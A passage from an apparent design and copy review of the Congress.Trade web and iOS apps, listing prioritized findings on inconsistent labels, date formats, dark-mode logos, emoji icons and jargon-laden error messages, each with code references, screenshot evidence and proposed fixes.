- **Panel:** ux-copy — Copy and the unconditional 401/402 gate both confirmed at the cited lines. · `ux-copy/UXCOPY-10`

#### 120. [P2] Trade drawer "Filing Notes" dumps raw JSON keys/values ("CAP GAINS OVER200: false", "ASSET TYPE NAME")

- **Where:** app/src/ui/dashboardHtml.ts:10934-11001 (unchanged)  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Machine field names and a literal boolean are shown as end-user copy in the public trade drawer; the same data is already humanized elsewhere (:6212 `capGainsOver200: 'Cap gains >$200'`).
- **Impact:** Reads as a debug dump inside the most-opened detail surface; "false" next to "Cap Gains Over200" is unreadable.
- **Fix:** Map known keys to labels (`Capital gains > $200: No/Yes`, `Sub-holding`, `Filing status`), drop keys already shown above (asset type), and hide unmapped keys.
- **Evidence:** .review-shots/web/desktop/trades-row-expanded-a11y.txt:170-178 `heading "FILING NOTES"`, `"ASSET TYPE NAME" "Stock"`, `"CAP GAINS OVER200" "false"`, `"FILING STATUS" "New"`, `"SUBHOLDING" "Hern Family Foundation"`.  Code: origin/main dashboardHtml.ts:10998-11003 `Object.keys(parsed)…kvRow(friendlyKey(k), esc(cleanNoteValue(parsed[k])))` with friendlyKey (:10934) doing only camelCase splitting; the same block also renders `[ST]` codes via assetTypeDetailHtml (:3931).
- **Panel:** ux-copy — a11y tree lines 170-178 and code at 10998-11003 confirmed. · merged: visual-design/VISUALDESIGN-22, web-ux-desktop/WEBUXDESKTOP-24 · `ux-copy/UXCOPY-11`

#### 122. [P2] Rising Activity table is wider than its card at 1440px — the 4th 'Politicians' column is clipped with no scroll affordance

- **Where:** Trends → Rising Activity (right column of the trend-grid-split)  ·  **Surface:** Web · desktop  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Asset names ellipsize but the table still overflows the half-width card; the fourth metric is effectively invisible on the default desktop viewport because nothing signals horizontal scroll.
- **Impact:** A whole data column is unreadable at 1440px on the landing page's most-viewed row of cards.
- **Fix:** Constrain the asset cell (`max-width` + ellipsis, as What Is Being Traded does), fold Politicians into the Trades cell ('0 → 13 · 6 pols'), or give `.table-wrap` a visible scroll shadow.  Verify at 1280/1440/1680.
- **Evidence:** desktop/trends-full.png crop (x 880-1440, y 700-1150): header reads 'ASSET | TRADES | CHANGE | P' — only the first letter of 'Politicians' is visible, every value cell of that column is cut at the card edge; same in dark/d-trends.png.  origin/main dashboardHtml.ts:2944-2953 declares 4 columns; :222 `.table-wrap { overflow-x: auto; … scrollbar-width: thin }` (macOS overlay scrollbars hide until scroll) so the column exists but is off-canvas; PR #2020 removed the Largest Buys/Sells split above but left this split unchanged.
- **Panel:** visual-design — Reproduced from the crop.  Downgraded to P2: the column is reachable by horizontal scroll (`overflow-x:auto`), so data is hidden, not lost. · `visual-design/VISUALDESIGN-03`

#### 123. [P2] Dark mode: transparent-background ticker logos with dark glyphs disappear (Estée Lauder) on both web and iOS

- **Where:** Trades cards / table logos, dark theme  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** logo.dev assets are drawn for light backgrounds; the dark theme puts them on a dark panel so any monochrome-dark logo vanishes, while white-background logos read as bright chips — an inconsistent, sometimes invisible logo row.
- **Impact:** Recognition of the asset fails in dark mode; visible on the first screen of dark Trades.
- **Fix:** Give logo tiles a constant light chip in dark (e.g. `background:#fff; border:1px solid var(--border)`), on web `.tkr-logo.transparent/.mono/.glyph` and on iOS the logo tile background — the neutral treatment iOS already uses for VSNT/DIAGEO tiles.  Optionally request logo.dev `?theme=dark` variants.
- **Evidence:** dark/dm-trades.png (crop y 1850-2532): EL tile is a dark navy square with 'ESTÉE LAUDER' barely legible, while OGN/MDLZ/KVUE tiles in the same list read as bright white chips; ios/dark/03-trades-dark.png same row.  origin/main dashboardHtml.ts:571-576 `.trades-card .tkr-logo.transparent, .mono, .glyph { background: var(--panel-2); … }` with only `html[data-theme="light"] … { background:#fff; }` — dark keeps the dark panel behind a logo whose glyphs are dark.  NOTES.md (h)16 also lists SPY/XOM/GOOGL reading as light chips.
- **Panel:** visual-design — Reproduced from the dark mobile crop (EL invisible, OGN white chip in the same list) and the CSS on origin/main. · `visual-design/VISUALDESIGN-05`

#### 124. [P2] Desktop Trades table shows dates as '8-5-26' while every other surface uses 'Aug 5, 2026'

- **Where:** Trades table Date column  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The compact numeric form (hyphens, no zero padding, 2-digit year, M-D order ambiguous to non-US readers) appears only in the primary desktop table because its column floor is below the width the long form needs, even though the row has hundreds of spare pixels.
- **Impact:** Least readable date format on the highest-density surface; inconsistent with mobile, drawers and iOS.
- **Fix:** Raise `traded/published/filed` default widths to ≥132 (or compute from the long label), or format compact dates as 'Aug 5, 2026' / 'Aug 5'; keep the numeric fallback only under ~92px.
- **Evidence:** desktop/trades.png Date column '8-5-26', '7-31-26', '7-30-26'; mobile/trades.png card 'Aug 5, 2026'; drawer 'Aug 5, 2026'; iOS 'Aug 5, 2026'.  origin/main dashboardHtml.ts:3953-3958 `compactDateText` → `Number(m[2]) + '-' + Number(m[3]) + '-' + m[1].slice(2)`; :4954 `traded: 88` default width and :4979 `if (w < 132) table.classList.add('narrow-' + key)` so the Date column is always 'narrow' and CSS :495-502 swaps in `.date-short`, while Politician (~460px) and Asset (~510px) columns carry large empty space.
- **Panel:** visual-design — Reproduced from desktop/trades.png crop and quoted the code (line numbers corrected: 3953-3958, 4954, 4979). · `visual-design/VISUALDESIGN-08`

#### 125. [P2] Desktop Trades search input is narrower than its own placeholder ('Search name, ticker, sta')

- **Where:** Trades toolbar search field  ·  **Surface:** Web · desktop  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** still-open-since-2026-08-18 (capture NOTES.md h.2)
- **What:** The wrapping span grows but the input inside does not, so the affordance reads as broken text on every desktop Trades load.
- **Impact:** Visible truncation on the primary table's main control.
- **Fix:** `.icon-field > .icon-input { width:100%; }` (or `flex:1`) — one line; verify at 1280.
- **Evidence:** desktop/trades.png toolbar crop: placeholder hard-clipped mid-word 'Search name, ticker, sta'; NOTES.md (h)2.  origin/main dashboardHtml.ts:1648 `.trades-toolbars #qSearchField { order:3; flex: 1 1 220px; min-width: 200px; }`, :2774-2775 `<span class="icon-field" id="qSearchField" style="min-width:0;flex:1"><input id="qSearch" class="icon-input" placeholder="Search name, ticker, state, party…">`; :1610-1611 `.icon-field { display:inline-flex … }` `.icon-input { padding:0 14px; … }` — no width on the input, so it keeps its intrinsic ~180px while the wrapper flexes.
- **Panel:** visual-design — Reproduced from the toolbar crop; CSS quoted.  Cross-lens overlap: UXCOPY-39 (P4). · merged: qa-bughunt/QABUGHUNT-22, ux-copy/UXCOPY-39, web-ux-desktop/WEBUXDESKTOP-41 · `visual-design/VISUALDESIGN-09`

#### 126. [P2] Two competing Buy/Sell pill styles on web (solid gradient + glow vs tinted chip) and a third on iOS

- **Where:** Trades table/cards/drawer (.tag) vs Trends Consensus/Conflicts tables (.dirpill) vs iOS TradeCard  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The same semantic has three treatments — solid gradient pill with drop shadow, tinted 6px chip, tinted iOS capsule — sometimes within one page.
- **Impact:** Semantic colour system feels ad hoc; the glow makes table rows heavier than the rest of the flat UI.
- **Fix:** Pick the tinted chip (matches iOS, lighter in tables) as the single side badge; one radius token; drop the gradient/box-shadow.
- **Evidence:** origin/main dashboardHtml.ts:516-518 `.tag { … border-radius: 999px; … color: #fff }` `.tag.S { background: linear-gradient(135deg, var(--sell), …); box-shadow: 0 4px 12px color-mix(in srgb, var(--sell) 30%, transparent); }` vs :1090-1092 `.dirpill { font-size:10px; … border-radius:6px } .dirpill.S { color: var(--sell); background: color-mix(in srgb, var(--sell) 16%, transparent); }`.  desktop/trades.png (solid red 'Sell'), trends-full.png Consensus Moves 'SOLD' (tinted), mobile/trades.png (solid with glow); iOS ios/light/13-trade-detail-expanded.png (tinted capsule with arrow glyph).
- **Panel:** visual-design — CSS quoted on origin/main; screenshots show all three variants. · `visual-design/VISUALDESIGN-10`

#### 127. [P2] Mobile web bottom tab bar mixes colour emoji with a text glyph and differs from iOS SF Symbols

- **Where:** Mobile bottom tab bar (Trends / Trades / Directory / Delivery)  ·  **Surface:** Web · mobile  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Emoji render differently per OS and cannot take the active/inactive tint; one of four is a plain text glyph — three icon 'families' in one bar.
- **Impact:** The mobile web shell looks less polished than the native app and the active state is weak.
- **Fix:** Replace `data-icon` emoji with inline SVG matching the SF Symbol shapes; tint via `currentColor`.
- **Evidence:** origin/main dashboardHtml.ts:2695-2700 `data-icon="📈"`, `data-icon="☰"`, `data-icon="👥"`, `data-icon="🔔"` (admin `✓` / `⚙`) — unchanged by PR #2017.  dark/dm-trades.png bottom bar: red/blue chart emoji, monochrome ☰, blue people emoji, yellow bell.  iOS uses `chart.line.uptrend.xyaxis / list.bullet.rectangle / person.2 / bell.badge` (ios/light/20-trends-top-loaded.png).
- **Panel:** visual-design — Confirmed the emoji data-icon attributes on origin/main (post-#2017) and the rendered bar in the dark mobile crop. · merged: web-mobile/WEBMOBILE-28 · `visual-design/VISUALDESIGN-11`

#### 128. [P2] iOS Delivery and Account forms lose their grouped-card affordance (white rows on white background)

- **Where:** Delivery tab, Account sheet, Export sheet  ·  **Surface:** iOS  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Hiding the system grouped background and painting `.systemBackground` behind a Form removes the tonal difference between rows and page, so sections have no edges; with the serif header inheritance the screens look unstyled next to the card-based tabs.
- **Impact:** Two of four tabs look like a different app; hierarchy is hard to scan.
- **Fix:** Keep `.insetGrouped` with the system grouped background (drop `.scrollContentBackground(.hidden)`), or use `AppTheme.panel` cards like Trends; style section headers like `trendsHeading`.
- **Evidence:** ios/light/60-delivery-tab-anonymous.png and 28-account-settings-sheet.png: no inset grouped cards; rows float on a flat white page with grey serif section headers.  origin/main DeliveryView.swift:29 `Form {` … :267-268 `.scrollContentBackground(.hidden)` `.background(AppTheme.background)`; Components.swift:78 `static let background = Color(uiColor: .systemBackground)`; SettingsView.swift:103/224/442/606 `.scrollContentBackground(.hidden)`.  Trends/Trades tabs draw explicit grey cards (20-trends-top-loaded.png).
- **Panel:** visual-design — Swift lines quoted on origin/main; screenshot composite confirms the flat white rendering. · merged: ios-hig-ux/IOSHIGUX-22 · `visual-design/VISUALDESIGN-13`

#### 174. [P2] Raw lowercase API error strings surface verbatim in iOS ("member not found", "Request failed", "daily feed row budget reached")

- **Where:** Politician sheet, Ticker sheet, Trends/Trades error banners  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** tracked-in-PR-#1973 (parity audit item 4 "the banner is often the raw string Request failed"; report-only)
- **What:** Backend machine-readable error strings (lowercase, terse, jargon like "feed row budget") are used as the user-facing message, under a generic "Error" title, with no next step.
- **Impact:** Users see cryptic text at exactly the moments they need guidance; contradicts the calm tone used elsewhere.
- **Fix:** Map APIError → friendly copy in one place ("We couldn't load this politician.  Pull to refresh or try again later.", "Congress.Trade isn't responding right now.  Retry."), keep the raw code in a secondary line or logs.
- **Evidence:** ios/light/42-politician-detail-pelosi-error.png shows `Error / member not found`; ios/light/03-trends-request-failed-state.png shows bare `Request failed` with no retry.  Code: origin/main APIClient.swift:842/863 `message: error?.error ?? "Request failed"`, :953 `case .server(_, let message, _): return message`; PoliticianDetailView.swift:44 `ContentUnavailableView("Error", …, description: Text(error))`; server strings app/src/client/routes.ts:260/:286 `'member not found'`, :152/:169/:192/:255 `'daily feed row budget reached'`, :427/:442 `'a duplicate command is already in flight; retry shortly'`.
- **Panel:** ux-copy — Code paths and server strings confirmed; PR #1973 diff line 45 records the raw "Request failed" banner. · `ux-copy/UXCOPY-12`

#### 175. [P2] Zilla Slab brand font: declared-but-unused on web, applied as accidental body font on iOS — no coherent brand typography across the family

- **Where:** Web CSS @font-face (dashboardHtml.ts:326-327); iOS root .font() (App.swift:45)  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The brand slab is used nowhere on web (dead font-face; the wordmark is a raster) and on iOS leaks only into text nobody explicitly styled — form headers, footers, placeholders — not headings, buttons or data.  Neither surface uses it deliberately.
- **Impact:** The two clients do not read as one family; iOS looks unfinished where serif and sans mix line-by-line.
- **Fix:** Decide the role of Zilla Slab once (recommend: display/wordmark + section headings only, on both platforms).  Web: use the hosted 700 woff2 for `.tf-h`/drawer titles or delete the @font-face.  iOS: remove the root `.font(.custom(...))`, add a `Font.brandTitle()` helper applied to headings explicitly; let body/data stay SF.
- **Evidence:** origin/main dashboardHtml.ts:327 `@font-face { font-family:'Zilla Slab'; … src:url(/assets/zilla-slab-700.woff2) }`; `grep -n 'Zilla Slab'` matches only :326-328 (face + comment) — no selector uses it; wordmark is a PNG (:2693 `<img class="brand-logo" src="/assets/brand-logo-light.png?v=20">`).  iOS: App.swift:45 `.font(.custom("ZillaSlab-Regular", size: 17, relativeTo: .body))` at the root; ios/light/60-delivery-tab-anonymous.png and 28-account-settings-sheet.png show serif section headers/footers/placeholders next to SF titles/buttons/rows.  PR #1973 parity matrix row 'Dynamic Type' notes 'Zilla Slab relativeTo: .body' as the iOS default.
- **Panel:** visual-design — Confirmed the dead @font-face on origin/main and the root custom font in App.swift; the composite of iOS Delivery/Premium/Trends screenshots shows the serif/sans mix. · merged: ios-hig-ux/IOSHIGUX-07, ios-shipped-app/IOSSHIPPEDAPP-31 · `visual-design/VISUALDESIGN-04`

#### 176. [P2] Snapshot/KPI tiles differ between web and iOS in metric set, labels, formatting and tile design

- **Where:** Trends → Snapshot (web) vs Market Snapshot (iOS)  ·  **Surface:** Cross-surface  ·  **Category:** design  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** Same backend summary, two dashboards: different metrics, label wording, tilde/rounding rules, tile alignment, sparklines vs none.
- **Impact:** Users moving between web and app cannot match numbers by eye; brand feels like two products.
- **Fix:** Share one KPI spec (metric list, label, formatter with `~` and rounding rules) — ideally served in the analytics summary as display fields — and align tile layout.
- **Evidence:** Web dashboardHtml.ts:10537-10540 `kpi('Trades')… kpi('Politicians')… kpi('Assets')… kpiInfo('Approx. Volume', estUsd(...))… 'Net Flow' … kpiInfo('Buy Pressure', …sparkBuyPressure)`; desktop/trends.png shows `~$97.4m`, sparklines, '66 % buys'.  iOS TrendsView.swift:188-203 `trendsHeading("Market Snapshot")`, `TrendKPI(title: "Est. Volume")`, `"Net Flow"`, `"Buys"`, `"Sells"`; ios/light/20-trends-top-loaded.png shows `$97.4m` (no tilde), no Assets/Buy Pressure tiles, no sparklines, green/red Buys/Sells.  iOS '$144.5k' vs web '~$145k' for the same What Is Being Traded row.
- **Panel:** visual-design — Both code sites and both screenshots confirmed.  Cross-lens overlap: UXCOPY-19 (label wording only). · merged: ios-hig-ux/IOSHIGUX-28 · `visual-design/VISUALDESIGN-15`

#### 248. [P3] Company section fallback still shows operator language ('once a market-data API key is configured')

- **Where:** app/src/ui/dashboardHtml.ts:10891  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (P2-3)
- **What:** 08-10 review P2-3 asked to replace API-key language with user-facing copy.  Half done.
- **Impact:** Anonymous users read an ops message about API keys.
- **Fix:** 'Company details aren't available for this asset yet.'
- **Evidence:** origin/main dashboardHtml.ts:10891 `var PROFILE_GATE = '<div class="tier-gate-note">🏢 Company details (sector, market cap, country, exchange) will appear here once a market-data API key is configured.</div>';` while the neighboring PERF_GATE (:10890) reads user-facing 'Price & performance appear here once market data for this asset is cached.' — confirming PERF_GATE was softened but PROFILE_GATE was not.
- **Panel:** prior-review-followup — Both lines quoted verbatim from origin/main; PROFILE_GATE unchanged, PERF_GATE already fixed as the finding notes. · merged: ux-copy/UXCOPY-22 · `prior-review-followup/PRIORREVIEWFOLLOWUP-07`

#### 268. [P3] iOS still says "feed" in Export sheet and retraction notice

- **Where:** Export CSV sheet caption; Trades tab notice  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Same "Trades tab, not feed" rule on iOS.
- **Impact:** Owner-defined defect.
- **Fix:** "Exports the Trades tab with its current filters for this range.  Premium required." / "…removed from the Trades tab."
- **Evidence:** origin/main clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:1221 `Text("Exports the filtered feed for this range. Premium required.")` (ios/light/30-export-csv-anonymous.png); Store/CongressTradeStore.swift:875 `feedNotice = "A disclosure you had open was retracted by its source and removed from your feed."`
- **Panel:** ux-copy — Both strings present verbatim on origin/main. · merged: app-store-compliance/APPSTORECOMPLIANCE-22 · `ux-copy/UXCOPY-04`

#### 269. [P3] iOS Trade Details shows Title-Case placeholder values "Not Enriched Yet", "Unavailable", and an unexplained "Confidence 95%" row

- **Where:** Trade Details → Company Info / Trade Summary  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Value slots use Title Case and internal vocabulary; "Confidence" (extraction confidence) is exposed to consumers with no explanation, unlike web where it is admin-only.
- **Impact:** Confuses readers ("confidence in what?") and breaks the fleet value-casing rule.
- **Fix:** `not available yet` / `not reported`; drop the Confidence row for non-admin users or label it "Extraction confidence" with a footnote.
- **Evidence:** origin/main TradeDetailView.swift:93 `DetailRow("Sector", trade.asset.sector ?? "Not Enriched Yet")`, :94 `…capBucketLabel ?? "Not Enriched Yet"`, :65 `DetailRow("Owner", … ?? "Unavailable")`, :66 `DetailRow("Confidence", "\(Int(…))%")` (ios/light/14-trade-detail-scrolled.png shows `Confidence 95%` under Trade Summary).  docs/FLEET-UI-COPY.md:36-40: values use sentence/lower case (`not reported`); "enriched" is pipeline jargon; web public columns never show extraction confidence.
- **Panel:** ux-copy — Lines and screenshot confirmed. · `ux-copy/UXCOPY-13`

#### 270. [P3] Web sign-in labels "Sign In with Apple" / "Sign In with Google" break Apple/Google button-branding casing and iOS parity

- **Where:** Sign In modal, auth error messages  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Capital "In" in the two provider buttons contradicts the vendors' required wording and the iOS app.
- **Impact:** Brand-guideline non-compliance on the web; inconsistent across platforms.
- **Fix:** Use "Sign in with Apple" / "Sign in with Google" for the provider buttons and error text; keep the product's own button "Sign In".
- **Evidence:** origin/main dashboardHtml.ts:3434 `Sign In with Google`, :3440 `Sign In with Apple` (desktop/signin.png; `Sign In with Apple` appears 4× in live HTML via curl), :11722/:12561 `'Sign In with Apple is not configured for this site yet.  Use Google.'`, :12555 `'Google Sign-In is not configured on this server.  Use Sign In with Apple.'`.  iOS uses `Sign in with Apple` (Components.swift:1082 accessibilityLabel; ios/light/28-account-settings-sheet.png).  Apple HIG requires the exact phrase "Sign in with Apple".
- **Panel:** ux-copy — Live curl shows `Sign In with Apple`; source lines confirmed. · merged: ios-shipped-app/IOSSHIPPEDAPP-30 · `ux-copy/UXCOPY-14`

#### 271. [P3] Same feature has three names: "Push Notifications" (web), "Trade Disclosure Alerts" (iOS toggle), "Alerts on This Phone" (iOS Delivery section)

- **Where:** Web Delivery tab; iOS Account sheet; iOS Delivery tab  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Web tells users to look for push alerts "in the iOS app under Delivery", where the section is titled "Alerts on This Phone" and the toggle is "Trade Disclosure Alerts".
- **Impact:** Cross-platform wayfinding friction; the web instruction points at a label that doesn't exist.
- **Fix:** Pick one name (e.g.  "Trade Alerts") for the section title, toggle and web sentence.
- **Evidence:** origin/main dashboardHtml.ts:3129-3130 `<h3>Push Notifications</h3><p class="sub">Phone push alerts are set in the iOS app under Delivery.&nbsp; …`; iOS DeliveryView.swift:33 `Text("Alerts on This Phone")`, :333 `Text("Trade Disclosure Alerts")`, :169 `…For those, use Trade Disclosure Alerts above.`; Components.swift:1275 `Toggle("Trade Disclosure Alerts"…)`.
- **Panel:** ux-copy — All four strings confirmed at the cited lines. · `ux-copy/UXCOPY-15`

#### 272. [P3] "Branch" vs "Chamber" used interchangeably (iOS Delivery says Chambers; web Directory select aria-label says Chamber filter)

- **Where:** iOS Delivery create form; web Directory filter  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The Executive Branch is not a "chamber", and the product otherwise settled on "Branch"; leftover "chamber" wording appears in iOS Delivery and the web Directory aria-label.
- **Impact:** Terminology drift; screen-reader label disagrees with visible text.
- **Fix:** "Branches" / "No selection delivers all branches." / aria-label "Branch filter".
- **Evidence:** iOS DeliveryView.swift:111 `Text("Chambers")`, :129 `Text("No selection delivers all chambers.")` while iOS filter chips say `All Branches` (FeedDashboardView.swift:479) and "Executive" is an option; web dashboardHtml.ts:3068 `<select id="peopleChamber" … aria-label="Chamber filter">` whose first option is `All Branches`; web Trades filter buttons use `aria-label="Filter by branch"` (:2735, :2871) with `All Branches` (:2740).
- **Panel:** ux-copy — Confirmed; corrected the web select line from 3169 to 3068. · `ux-copy/UXCOPY-16`

#### 273. [P3] iOS Delivery uses "Existing Subscriptions" / "delivery subscriptions" where the product term is Delivery/deliveries

- **Where:** Delivery tab section header + empty states  ·  **Surface:** iOS  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** "Subscription" is also the word used for the Premium billing subscription two sections above ("Subscribe with Apple"), so the same screen uses one word for two things.
- **Impact:** Ambiguity between billing subscription and delivery targets.
- **Fix:** "Your Deliveries" / "No deliveries yet." / "Sign in to manage your deliveries."
- **Evidence:** origin/main DeliveryView.swift:172 `Section("Existing Subscriptions")`, :174 `"No delivery subscriptions yet." : "Sign in to manage delivery subscriptions."` (ios/light/60-delivery-tab-anonymous.png); web uses `Delivery`, `deliveries`, `No deliveries yet` (dashboardHtml.ts:3152, :6771).
- **Panel:** ux-copy — Strings confirmed at the cited lines. · `ux-copy/UXCOPY-18`

#### 274. [P3] Snapshot metric names differ within web and across platforms (Approx. Volume vs Est. Volume; Snapshot vs Market Snapshot; Median Lag vs Median Delay)

- **Where:** app/src/ui/dashboardHtml.ts:10724 (KPI line; corrected from prior 10693-10695)  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Same metrics carry different labels on the same page and across web/iOS, so users switching devices or comparing sections cannot tell whether they are the same number.
- **Impact:** Comprehension and perceived polish; "Members" also collides with House "Members" vs Senators/Executive filers.
- **Fix:** Adopt one glossary (Approx.  Volume, Snapshot, Median Lag / P90 Lag / Over 45 Days, Politicians, Filing Latency vs Data Providers) and apply on both platforms.
- **Evidence:** Web: .review-shots/web/desktop/trends-a11y.txt:32 `APPROX. VOLUME` tile vs :111 `EST. VOLUME` column on the same page; :25 `SNAPSHOT`.  iOS TrendsView.swift:188 `"Market Snapshot"`, :192 `"Est. Volume"`, :734-737 `"Median Delay"`, `"P90 Delay"`, `"Over 45 Days"` vs web dashboardHtml.ts:10724 `kpi('Median Lag'…)`, :10726 `kpiLabel('&gt;45 Day Lag', '>45d Lag', '>45d')`; iOS TickerDetailView.swift:93 tile `"Members"` vs "Politicians" everywhere else; iOS `"Speed vs. Data Providers"` (TrendsView.swift:1065) vs web `Filing Latency Comparison` (:62) / link text `Filing latency comparison` (:3053).
- **Panel:** ux-copy — a11y tree and Swift lines confirmed; web KPI lines corrected from 10693-10695 to 10724/10726 and latency heading to :62/:3053. · `ux-copy/UXCOPY-19`

#### 275. [P3] Money-suffix casing still mixed: "$250k-$1M", "Over $1M", "$50M+" vs lowercase k/m/b elsewhere

- **Where:** app/src/ui/dashboardHtml.ts:4366-4367,9286,9288  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-1)
- **What:** Uppercase M survives in tier labels and the two most-read tooltips.
- **Impact:** Owner style rule; inconsistent within one screen.
- **Fix:** `$250k–$1m`, `Over $1m`, `$50m+`; also use en dash for ranges as the amount cells do.
- **Evidence:** origin/main dashboardHtml.ts:4366 `label: '$250k-$1M', title: 'Trade size bracket: $250k-$1M'`, :4367 `'Over $1M'`; :9286 EST_VOLUME_TIP `the open $50M+ range uses its $50,000,001 floor` (rendered in desktop/trends-a11y.txt:33), :9288 `($50M+ uses its floor)`; Delivery min-size select uses `$1m+` (:3193), `$50m+` (:3196); docs/FLEET-UI-COPY.md:70 compact suffixes lowercase.
- **Panel:** ux-copy — Confirmed on origin/main and in the live a11y tree; P2-1 in the 2026-08-10 review is unfixed. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-11 · `ux-copy/UXCOPY-20`

#### 276. [P3] Delivery select shows lowercase "webhook" beside "SSE", and pricing badge shouts "SAVE ~17%"

- **Where:** Delivery create form; Premium modal annual card  ·  **Surface:** Web  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P2-2)
- **What:** Casing drift already called out on 2026-08-10; still present.
- **Impact:** Polish.
- **Fix:** `Webhook`; `Save 17%` (drop the tilde — 2 months free is exactly 16.7%, "Save 2 months" is clearer).
- **Evidence:** origin/main dashboardHtml.ts:3165 `<option value="sse">SSE</option><option value="webhook">webhook</option>`; :3467 `<span class="save">SAVE ~17%</span>` (desktop/pricing.png; confirmed live via curl).
- **Panel:** ux-copy — Confirmed; select line corrected to 3165; SAVE ~17% present in live HTML. · merged: prior-review-followup/PRIORREVIEWFOLLOWUP-12 · `ux-copy/UXCOPY-21`

#### 277. [P3] "price cache backfills", "scout ingests", "provider-only rows", "races" — pipeline jargon in public empty states and cards

- **Where:** Trends Top Performers empty state; member drawer performance; pricing modal (alerts intent); Speed vs Data Providers cards  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Internal nouns (price cache, scout, probes, races, first-seen timestamps, coverage denominator, "CT") leak into consumer-facing empty states and cards.
- **Impact:** Readers cannot tell what to expect or when; "CT filings" is an unexplained abbreviation.
- **Fix:** "Not enough priced buys to score yet."; "…the moment we import it"; provider cards: "Not enough overlapping filings yet to compare speed."; spell out Congress.Trade.
- **Evidence:** Web dashboardHtml.ts:10508 `'Not enough priced, filing-anchored buys to rank yet — this fills in as the price cache backfills.'`, :11184/:11290 `No priced equity buys to score yet — this fills in as the price cache backfills.` (desktop/member.png); :11750 `Premium pushes them to you the moment our scout ingests`; :56-57 `Provider-only rows stay in the coverage denominator`.  iOS TrendsView.swift:1330-1336 `Matched N races but no usable first-seen timestamps for lead/lag yet.`, `Probes haven't found concurrent races yet.` (ios/light/21-trends-scroll-07-bottom.png), :1211 `typical earlier (coverage still building)`.
- **Panel:** ux-copy — All cited strings confirmed on origin/main. · `ux-copy/UXCOPY-23`

#### 278. [P3] Four different disclaimer sentences across web footer, legal footer, iOS banner and iOS Account sheet

- **Where:** Footers and disclaimer banners  ·  **Surface:** Cross-surface  ·  **Category:** copy  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The one legally important sentence is phrased four ways and the web footer ignores the wide-separator convention.
- **Impact:** Consistency and owner style.
- **Fix:** One canonical disclaimer string shared by web (SPA + legal shell) and iOS; use `  •  ` separators on the web footer.
- **Evidence:** Web dashboardHtml.ts:3410 / :11575 `Congress.Trade · educational tool for public STOCK Act (2012) disclosures · not financial advice · $ estimated from brackets`; legalHtml.ts footer `Congress.Trade · an educational tool for exploring public STOCK Act (2012) disclosures · informational only — not financial advice, not trading signals · dollar figures are estimates from disclosed brackets`; iOS FeedDashboardView.swift:1182 `Congress.Trade is an informational tool for exploring public STOCK Act disclosures. Summaries are historical observational views — not trading signals or investment advice. …`; iOS Components.swift:906 `Congress.Trade is an educational tool for public STOCK Act disclosures.  Not financial advice — dollar figures are estimates from disclosed brackets.`  Web footer uses narrow ` · ` separators, not the owner's wide `  •  `.
- **Panel:** ux-copy — All four variants confirmed; footer line corrected to 3410 (also FOOTER_DISCLAIMER_TEXT at 11575). · merged: ios-shipped-app/IOSSHIPPEDAPP-49 · `ux-copy/UXCOPY-25`

#### 280. [P3] Emoji used as UI iconography across web controls (📅 🏛 👥 🔗 📈 ⚡) — inconsistent with iOS symbols and OS-dependent rendering

- **Where:** Trends/Trades filter chips, drawer links, placeholders  ·  **Surface:** Web  ·  **Category:** design  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Controls and links rely on colour emoji whose glyphs, weight and colour differ by OS/browser and cannot inherit theme colour.
- **Impact:** Chip row reads as consumer-emoji rather than a data product; not one family with iOS.
- **Fix:** Swap for inline SVG icons (calendar, columns, people, link, chart) at 13–14px, `fill:currentColor`; keep emoji only in prose.
